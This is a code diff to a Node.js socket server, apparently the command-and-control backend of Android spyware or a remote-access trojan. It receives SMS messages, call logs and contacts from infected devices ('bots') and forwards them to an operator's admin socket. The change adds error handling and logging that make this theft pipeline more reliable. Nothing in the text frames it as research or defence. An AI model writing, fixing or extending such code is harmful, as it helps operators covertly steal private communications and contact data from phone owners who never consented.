@@ -469,31 +469,63 @@ function setupBotDataHandlers(socket) {
             const dataType = data.dataType;
             log('info', `Data from ${socket.botUID}: ${dataType}`);
             
+            // Log raw data for debugging
+            if (dataType === 'sms' || dataType === 'contacts' || dataType === 'callLog') {
+                log('info', `Raw ${dataType} data type: ${typeof data[dataType]}, length: ${data[dataType]?.length || 'N/A'}`);
+            }
+            
             // Parse and forward based on dataType
             if (adminSocket && adminSocket.connected) {
                 switch (dataType) {
                     case 'sms':
-                        const smsData = JSON.parse(data.sms || '[]');
-                        adminSocket.emit('smsData', { 
-                            uniqueId: socket.botUID, 
-                            data: smsData 
-                        });
+                        try {
+                            const smsData = typeof data.sms === 'string' ? JSON.parse(data.sms) : (data.sms || []);
+                            log('info', `SMS data parsed: ${smsData.length} messages`);
+                            adminSocket.emit('smsData', { 
+                                uniqueId: socket.botUID, 
+                                data: smsData 
+                            });
+                        } catch (err) {
+                            log('error', `Error parsing SMS data: ${err.message}`);
+                            adminSocket.emit('smsData', { 
+                                uniqueId: socket.botUID, 
+                                data: [] 
+                            });
+                        }
                         break;
                         
                     case 'callLog':
-                        const callData = JSON.parse(data.callLog || '[]');
-                        adminSocket.emit('callLogData', { 
-                            uniqueId: socket.botUID, 
-                            data: callData 
-                        });
+                        try {
+                            const callData = typeof data.callLog === 'string' ? JSON.parse(data.callLog) : (data.callLog || []);
+                            log('info', `Call log data parsed: ${callData.length} calls`);
+                            adminSocket.emit('callLogData', { 
+                                uniqueId: socket.botUID, 
+                                data: callData 
+                            });
+                        } catch (err) {
+                            log('error', `Error parsing call log data: ${err.message}`);
+                            adminSocket.emit('callLogData', { 
+                                uniqueId: socket.botUID, 
+                                data: [] 
+                            });
+                        }
                         break;
                         
                     case 'contacts':
-                        const contactsData = JSON.parse(data.contacts || '[]');
-                        adminSocket.emit('contactsData', { 
-                            uniqueId: socket.botUID, 
-                            data: contactsData 
-                        });
+                        try {
+                            const contactsData = typeof data.contacts === 'string' ? JSON.parse(data.contacts) : (data.contacts || []);
+                            log('info', `Contacts data parsed: ${contactsData.length} contacts`);
+                            adminSocket.emit('contactsData', { 
+                                uniqueId: socket.botUID, 
+                                data: contactsData 
+                            });
+                        } catch (err) {
+                            log('error', `Error parsing contacts data: ${err.message}`);
+                            adminSocket.emit('contactsData', { 
+                                uniqueId: socket.botUID, 
+                                data: [] 
+                            });
+                        }
                         break;
                         
                     case 'location':
